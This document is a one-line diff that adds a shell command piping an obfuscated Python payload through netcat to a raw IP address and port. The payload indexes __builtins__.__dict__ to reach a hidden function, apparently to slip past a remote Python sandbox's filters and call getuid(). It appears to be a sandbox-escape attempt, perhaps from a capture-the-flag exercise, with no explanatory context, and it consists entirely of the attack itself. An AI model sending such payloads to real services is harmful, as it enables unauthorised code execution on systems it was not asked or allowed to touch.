@@ -1,0 +1,1 @@
+echo "a=(list(__builtins__.__dict__)[6]);a=__builtins__.__dict__[a];print(a(key).getuid())"|nc 168.62.41.251 5950
